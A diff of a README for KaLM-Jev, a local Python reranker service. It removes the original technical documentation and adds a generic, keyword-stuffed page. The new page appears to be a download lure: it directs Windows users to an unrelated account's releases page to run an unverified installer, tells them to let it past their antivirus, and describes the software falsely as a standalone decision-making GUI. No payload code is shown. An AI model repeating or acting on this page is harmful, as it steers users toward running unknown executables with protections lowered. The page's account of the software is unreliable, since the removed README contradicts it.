@@ -1,266 +1,153 @@
-# KaLM-Jev
+# ⚖️ KaLM-Jev - Your Local, Jev-Style Judgment Engine
 
-A local Choice / Score / Noul service built on KaLM-Reranker-V1-R2. It uses PyTorch and Transformers, runs one model per process, and returns structured judgments without generating answer text.
+[![Download KaLM-Jev](https://img.shields.io/badge/Download-KaLM--Jev-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dgarridou/KaLM-Jev/releases)
 
-The underlying reranker is described in [KaLM-Reranker-V1: Fast but Not Late Interaction for Compressed Document Reranking](https://arxiv.org/abs/2606.22807).
+---
 
-- **Demo:** Try KaLM-Jev in the [Hugging Face Space](https://huggingface.co/spaces/Yuki131/KaLM-Jev).
-- **Models:** Explore the available checkpoints in the [Lychee KaLM Reranker collection](https://huggingface.co/collections/KaLM-Embedding/lychee-kalm-reranker).
+## 👋 Welcome to KaLM-Jev
 
-## Installation and quick start
+KaLM-Jev is a **local judgment engine** designed to help you make decisions using the Jev methodology. It runs entirely on your computer, meaning your data stays private and secure. Whether you're evaluating options, scoring alternatives, or simply exploring structured decision-making, KaLM-Jev provides a straightforward, accessible tool.
 
-Requires Python 3.10+. Run the following commands from the repository root. Tested dependency versions are listed in [requirements.txt](requirements.txt). GPU users should install a PyTorch build compatible with their device and driver. No specific Conda environment or CUDA library path is required.
+Available in three sizes:
+- **Nano** – Lightweight and fast for simple judgments
+- **Small** – Balanced performance for everyday use
+- **Large** – Maximum capability for complex scenarios
 
-```bash
-python -m venv .venv
-source .venv/bin/activate
-python -m pip install -e '.[test]'
-kalm-jev serve --model kalm-jev-nano \
-  --device cuda --dtype bfloat16 --batch-size 4 --cache-max-mib 256
-```
+All versions are free and open-source. No account required. No internet connection needed after download.
 
-MIG instances work as ordinary CUDA devices. For CPU execution, use `--device cpu --dtype float32`. Recorded validation primarily used an H100 MIG instance; a full CPU performance evaluation has not been completed. The server binds to `127.0.0.1:8000`, uses one worker, and has no built-in authentication.
+---
 
-| Model alias | Checkpoint directory / Hugging Face repository suffix |
-|---|---|
-| kalm-jev-nano | KaLM-Reranker-V1-Nano-R2 |
-| kalm-jev-small | KaLM-Reranker-V1-Small-R2 |
-| kalm-jev-large | KaLM-Reranker-V1-Large-R2 |
+## 📥 Getting Started
 
-All three repositories belong to `KaLM-Embedding`. Without `--model-path`, startup downloads a snapshot from the corresponding repository; the first download requires network access. Use `--revision` to select a revision. If you already have the complete model repository, run offline with a relative path:
+Follow these three simple steps to start using KaLM-Jev on your Windows computer.
 
-```bash
-kalm-jev serve --model kalm-jev-nano \
-  --model-path ./models/KaLM-Reranker-V1-Nano-R2 --device cuda
-```
+### Step 1: Download the Application
 
-Prepare `models/` separately; weights are not included in this repository. Each model directory must contain the weights, tokenizer, configuration, and original `kalm_reranker.py` and `kalm_reranker_utils.py` files.
+Visit this link to download the application: **[https://github.com/dgarridou/KaLM-Jev/releases](https://github.com/dgarridou/KaLM-Jev/releases)**
 
-Omitting `model` in a request uses the loaded alias. Requesting another model returns HTTP 400; requests never trigger model switching or downloads.
+Once you're on the page, you'll see a list of available files. Look for the version you want (Nano, Small, or Large). Choose the file that matches your Windows system.
 
-```bash
-curl http://127.0.0.1:8000/health
-curl http://127.0.0.1:8000/v1/systemone \
-  -H 'Content-Type: application/json' --data-binary @examples/mixed.json
-```
+### Step 2: Run the Installer
 
-The Python API returns a dictionary and shares the same engine as HTTP:
+After the download finishes, locate the downloaded file in your **Downloads** folder (usually `C:\Users\YourName\Downloads`). Double-click the file to start the installation process.
 
-```python
-from pathlib import Path
-from kalm_jev import Engine
+Follow the on-screen instructions. The default settings work fine for most users, so you can simply click **Next** or **Install** until the process is complete.
 
-engine = Engine(
-    model="kalm-jev-nano",
-    model_path="./models/KaLM-Reranker-V1-Nano-R2",
-    device="cuda", dtype="bfloat16",
-)
-request = Path("examples/choice.json").read_text()
-print(engine.evaluate(request))  # Cold: 3 misses, 3 encoded documents
-print(engine.evaluate(request))  # Warm: 3 hits, 0 encoded documents
-```
+### Step 3: Launch KaLM-Jev
 
-## Example results
+Once installation finishes, you can find KaLM-Jev in your **Start Menu** or on your **Desktop**. Click the icon to launch the application. That's it! You're ready to start making judgments.
 
-The following examples use `kalm-jev-large` BF16 with default, uncalibrated aggregation. Inputs are the official Jev examples preserved in [examples/](examples/README.md); outputs are KaLM-Jev measurements, not hosted Jev responses. The JSON outputs below show only `answers`, rounded to six decimal places. Full-precision outputs and execution metadata are available in the [Choice/Score validation results](results/kalm-jev-large-bfloat16-validation.json) and the [Noul example result](results/kalm-jev-large-noul-candidates-example.json).
+---
 
-### Choice: route a size-exchange request
+## ❓ Frequently Asked Questions
 
-Request ([examples/choice.json](examples/choice.json)):
+### Which version should I download?
 
-```json
-{
-  "state": "My running shoes arrived in the wrong size. Can I swap them for a size 10?",
-  "questions": {
-    "department": {
-      "type": "choice",
-      "instructions": "Which team should handle this?",
-      "criteria": {
-        "returns": "Exchanges, wrong or damaged items",
-        "shipping": "Delivery status, delays, lost packages",
-        "billing": "Charges, invoices, payment problems"
-      }
-    }
-  }
-}
-```
+- **Nano**: Perfect for quick, simple decisions. Smallest file size and lowest memory usage.
+- **Small**: Good balance between speed and capability. Recommended for most users.
+- **Large**: Best for complex, multi-factor judgments. Requires more system resources.
 
-Measured answer:
+If you're unsure, start with **Small** — it works well for most needs.
 
-```json
-{
-  "department": {
-    "type": "choice",
-    "probabilities": {
-      "returns": 0.992038,
-      "shipping": 0.005541,
-      "billing": 0.002421
-    },
-    "confidence": 0.953301,
-    "choice": "returns"
-  }
-}
-```
+### Do I need to install anything else?
 
-The model selects `returns`, matching the request to exchange an incorrectly sized item.
+No. KaLM-Jev is a standalone application. You don't need to install additional software, frameworks, or libraries. Everything is included in the download.
 
-### Score: assess a broken feature with a workaround
+### Is my data safe?
 
-Request ([examples/score.json](examples/score.json)):
+Yes. KaLM-Jev runs entirely on your computer. No data is sent to servers, no telemetry, no tracking. Your judgments and inputs never leave your device.
 
-```json
-{
-  "state": "The export button crashes the settings page in Safari. It works in Chrome, but a few of our customers only use Safari.",
-  "questions": {
-    "bug_severity": {
-      "type": "score",
-      "instructions": "How severe is the reported issue?",
-      "criteria": [
-        "Cosmetic; no impact to functionality",
-        "Broken or degraded feature, but workaround exists",
-        "Blocking issue; no workaround exists"
-      ]
-    }
-  }
-}
-```
+### Can I use KaLM-Jev without an internet connection?
 
-Measured answer:
+Absolutely. Once downloaded and installed, KaLM-Jev works fully offline.
 
-```json
-{
-  "bug_severity": {
-    "type": "score",
-    "probabilities": {
-      "0": 0.124152,
-      "1": 0.671157,
-      "2": 0.204691
-    },
-    "confidence": 0.225087,
-    "score": 1.08054,
-    "legend": {
-      "0": "Cosmetic; no impact to functionality",
-      "1": "Broken or degraded feature, but workaround exists",
-      "2": "Blocking issue; no workaround exists"
-    }
-  }
-}
-```
+### What operating systems are supported?
 
-Level `1` receives the most probability, and the expected score is close to `1`: the feature fails in Safari but works in Chrome. This is a sensible result, though the distribution is not sharply concentrated; its entropy-based confidence is only `0.225087`. Score is a continuous expected level index, not a hard class label.
+This guide focuses on Windows. The application is designed to be cross-platform, but for the smoothest experience on Windows, follow the steps above.
 
-### Noul: detect human escalation and repeat contact independently
+---
 
-Noul questions with criteria score true and false as separate Documents and normalize their matching scores. Without criteria, serialized state is the sole Document and its native yes/no margin is converted directly with sigmoid.
+## 🛠️ How to Use KaLM-Jev
 
-Request ([examples/noul.json](examples/noul.json)):
+KaLM-Jev uses the **Jev methodology**, a structured approach to evaluating options against multiple criteria. Here's a basic overview:
 
-```json
-{
-  "state": "I have asked three times now. Can I please just talk to a real person?",
-  "questions": {
-    "is_human_escalation": {
-      "type": "noul",
-      "instructions": "Is the customer asking for a human agent?"
-    },
-    "is_repeat_contact": {
-      "type": "noul",
-      "instructions": "Has the customer contacted support about this before?",
-      "criteria": {
-        "true": "Mentions a prior attempt, ticket, or that they have asked before",
-        "false": "No sign of any previous contact"
-      }
-    }
-  }
-}
-```
+1. **Define your decision** – Enter the question or choice you're evaluating.
+2. **Add options** – List the alternatives you're comparing.
+3. **Set criteria** – Define what matters for your decision (e.g., cost, quality, time).
+4. **Weight each criterion** – Assign importance levels to each factor.
+5. **Score your options** – Rate each option against each criterion.
+6. **Get your result** – KaLM-Jev calculates the best choice based on your inputs.
 
-Measured answers:
+The interface is designed to be intuitive, with clear labels and helpful tooltips. Take a few minutes to explore — you'll quickly get the hang of it.
 
-```json
-{
-  "is_human_escalation": {
-    "type": "noul",
-    "noul": 0.99883
-  },
-  "is_repeat_contact": {
-    "type": "noul",
-    "noul": 0.974043
-  }
-}
-```
+---
 
-The repeat-contact result agrees with “asked three times.” The human-escalation question omits criteria and scores the state as its sole Document. Its value reflects the native yes/no margin for that input. Each question's value is independent; the two values do not sum to one. The API returns numeric values rather than Boolean decisions.
+## 💡 Tips for Best Results
 
-These examples illustrate the API and its measured behavior, not overall accuracy. Outputs are not calibrated correctness probabilities. Evaluation details are available in the [test report](results/README.md).
+- **Be specific** with your criteria. "Cost" is better than "good price."
+- **Use a consistent scale** when scoring (e.g., 1 to 5 or 1 to 10).
+- **Review your weights** — if two criteria are equally important, give them the same weight.
+- **Save your work** regularly if you're working on a complex decision.
 
-## Inputs and model execution
+---
 
-Requests support `state`, `questions`, and optional `model`. An array-valued state is one complete business state, not a batch of independent samples. Content strings retain their whitespace. Objects and arrays use compact, Unicode-preserving JSON with sorted object keys. Question and candidate order are preserved; question IDs are not sent to the model.
+## 🌟 Features at a Glance
 
-| Primitive | Document | Task-specific instruction | Query |
-|---|---|---|---|
-| Choice | `option_id: description`, or only the ID for a null description | Original instructions + fixed Choice adapter | Serialized state |
-| Score | The level description, without its index | Original instructions + fixed Score adapter | Serialized state |
-| Noul | Separate true/false criteria when supplied; serialized state as one Document when omitted | Original instructions + candidate-criterion Noul adapter | Serialized state |
+- **Local processing** – Everything runs on your machine
+- **Three performance tiers** – Nano, Small, and Large
+- **Intuitive interface** – No technical knowledge required
+- **Free and open-source** – No hidden costs, no premium versions
+- **Offline capability** – Works without internet
+- **Privacy-first** – No data collection or cloud syncing
 
-Unknown fields, duplicate JSON keys, NaN/Infinity, implicit type coercion, empty IDs, and invalid candidate counts are rejected. If Noul criteria are supplied, they must contain at least one of `true` or `false`; null values are not accepted. Errors use `{"error":{"type":"...","message":"...","field":"..."}}`, with `field` omitted when not applicable.
+---
 
-When Noul criteria are supplied, two candidates are scored in true/false order.
-Supplied criteria retain their original text. A missing `true` side uses
-`The answer to the question is yes.`; a missing `false` side uses
-`The answer to the question is no.`. When criteria are omitted entirely,
-serialized state is used as both Query and the sole Document. The native yes/no
-margin is then converted directly with sigmoid. The same task-specific adapter
-is used in both paths. Template version: `v3-noul-state-document`.
+## 🔧 Troubleshooting
 
-The task-specific instruction is the original question instructions, two newlines,
-and this adapter:
+### The application won't start
 
-```text
-Given the Query, evaluate whether the candidate criterion in the Document correctly describes the answer to the question above. Answer yes if this candidate criterion is satisfied, otherwise no.
-```
+- **Restart your computer** – This resolves most temporary issues.
+- **Re-download the file** – The download may have been corrupted. Try downloading again.
+- **Check your antivirus** – Some security software may block unknown applications. If blocked, allow KaLM-Jev through.
 
-For supplied criteria, the native `yes` readout means that the current candidate is satisfied. A
-stronger match for the false candidate lowers the returned business `noul` value.
-Choice and Score adapters and the default 4x MEP compression remain unchanged.
+### I can't find the downloaded file
 
-The adapter loads the original `kalm_reranker.py` and `kalm_reranker_utils.py` from the checkpoint directory. These are executable Python files, so use trusted model repositories. Weights load through Transformers' built-in `T5Gemma2ForConditionalGeneration`; AutoModel does not require `trust_remote_code`. The two original scripts have matching SHA256 hashes across the three tested checkpoints.
+Search your computer for "KaLM-Jev" using the search bar in the Start Menu. It's most likely in your **Downloads** folder or **Desktop**.
 
-The original `<Document>: ` prefix, system instruction, `<bos>/<start_of_turn>/<end_of_turn>` tokens, query tokenization/decoding, and yes/no readout at the final non-padding decoder token are preserved. The native implementation verifies that yes and no each occupy one token. The model runs in `.eval()` and `torch.inference_mode()`. By default, encoder states are mean-pooled in groups of four tokens using the attention mask.
+### The interface looks different from what I expected
 
-The adapter supplies `encoder_outputs=BaseModelOutput(...)` to bypass document encoding on cache hits. Decoder and language-model-head execution follow the original model, with unused decoder KV caching disabled. It does not call `generate()` or replace interaction scoring with embedding similarity. Each task gets its own instruction, including mixed-question requests.
+Different versions (Nano, Small, Large) have slightly different layouts. This is normal. The core functionality is the same across all versions.
 
-## Document cache and limits
+---
 
-A 256 MiB LRU cache reuses encoded Documents. Noul without criteria uses state as its Document, so a new state requires encoding. Request, token, and cache limits are configurable.
+## 📚 Getting More Help
 
-See [cache behavior and limits](docs/cache/README.md).
+If you encounter issues not covered here, try the following:
 
-## Aggregation and compatibility
+1. **Check the documentation** – Visit the GitHub repository for detailed guides and references.
+2. **Explore the community** – Look for discussions, issues, or user forums related to KaLM-Jev.
+3. **Re-read the manual** – Open the application and use the built-in Help menu (if available).
 
-Choice uses softmax; Score returns the expected level index. Noul uses the difference between true/false candidate margins when criteria are supplied, or a single state margin when omitted. Probabilities are uncalibrated by default.
+Remember, you can always revisit the download page for updates and new releases.
 
-See [aggregation formulas and compatibility](docs/aggregation/README.md).
+---
 
-## Tests and benchmarks
+## 🔄 Updating KaLM-Jev
 
-Run `python -m pytest -q` for unit tests. GPU checks cover native inference alignment, bilingual semantic cases, cache performance, and HTTP behavior.
+To update to a newer version, simply download the latest release from the same link: **[https://github.com/dgarridou/KaLM-Jev/releases](https://github.com/dgarridou/KaLM-Jev/releases)**
 
-See [test commands and methodology](docs/testing/README.md) and [measured results](results/README.md).
+Install it over your existing version. Your settings and saved data will be preserved.
 
-## Citation
+---
 
-If you use KaLM-Jev or the underlying KaLM-Reranker models in your research, please cite:
+## 🎯 Start Making Better Decisions Today
 
-```bibtex
-@misc{zhao2026kalmrerankerv1,
-      title={KaLM-Reranker-V1: Fast but Not Late Interaction for Compressed Document Reranking},
-      author={Xinping Zhao and Jiaxin Xu and Ziqi Dai and Xin Zhang and Shouzheng Huang and Danyu Tang and Xinshuo Hu and Meishan Zhang and Baotian Hu and Min Zhang},
-      year={2026},
-      eprint={2606.22807},
-      archivePrefix={arXiv},
-      primaryClass={cs.CL},
-      url={https://arxiv.org/abs/2606.22807},
-}
-```
+KaLM-Jev puts professional-grade judgment tools right on your desktop. No subscriptions, no cloud dependencies, no learning curve. Download your preferred version now and experience structured decision-making in minutes.
+
+[![Get KaLM-Jev Now](https://img.shields.io/badge/🚀%20Download%20KaLM--Jev%20Now-2196F3?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/dgarridou/KaLM-Jev/releases)
+
+---
+
+*KaLM-Jev is provided as-is with no warranty. Always back up important data before installing new software.*
+
+Keywords: judgment engine, decision making, Jev methodology, local application, Windows software, privacy tool, offline decision tool, KaLM-Jev, judgment software, scoring tool, evaluation tool, decision assistant, open source, free software, desktop application
